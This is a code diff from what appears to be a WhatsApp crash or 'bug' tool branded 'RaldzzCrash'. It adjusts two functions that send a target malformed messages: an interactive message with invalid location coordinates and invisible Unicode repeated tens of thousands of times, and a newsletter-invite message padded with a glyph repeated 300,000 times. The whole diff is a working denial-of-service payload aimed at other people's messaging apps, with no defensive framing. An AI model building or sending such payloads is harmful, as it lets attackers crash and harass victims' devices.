@@ -1515,17 +1515,17 @@ async function sendxoMessage(target) {
                 interactiveMessage: {
                     header: {
                         locationMessage: {
-                            degreesLatitude: -999.03499999999999,
-                            degreesLongitude: 999.03499999999999
+                            degreesLatitude: -999.034999999,
+                            degreesLongitude: 999.034999999
                         },
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) 
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(50000) 
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
-                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        mentionedJid: Array.from({ length: 3 }, () => "1@newsletter"),
                         groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RALDZZ CRASH" }]
                     }
                 }
@@ -1573,9 +1573,9 @@ async function blank(target) {
 					'message': {
 						"newsletterAdminInviteMessage": {
 							"newsletterJid": `120363298524333143@newsletter`,
-							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(350000),
+							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(300000),
 							"jpegThumbnail": "",
-							"caption": "ꦾ".repeat(350000),
+							"caption": "ꦾ".repeat(300000),
 							"inviteExpiration": Date.now() + 1814400000
 						}
 					}
